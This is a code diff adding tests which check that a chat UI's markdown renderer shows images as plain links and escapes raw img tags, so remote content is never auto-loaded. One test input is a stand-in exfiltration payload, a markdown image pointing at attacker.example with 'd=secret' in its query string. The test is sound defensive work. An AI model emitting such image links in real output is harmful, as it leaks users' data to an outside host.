@@ -25,3 +25,14 @@ describe('renderMarkdown', () => {
 		expect(renderMarkdown('')).toBe('');
 	});
 });
+describe('chat markdown never auto-loads remote content (tilt_ui-eevz.10)', () => {
+	it('renders images as plain links, not <img>', () => {
+		const html = renderMarkdown('Look ![hop](https://attacker.example/x.png?d=secret) here');
+		expect(html).not.toContain('<img');
+		expect(html).toContain('[image: hop]');
+		expect(html).toContain('href="https://attacker.example/x.png?d=secret"');
+	});
+	it('still escapes raw HTML img tags', () => {
+		expect(renderMarkdown('<img src="https://a.example/p.png">')).not.toContain('<img');
+	});
+});
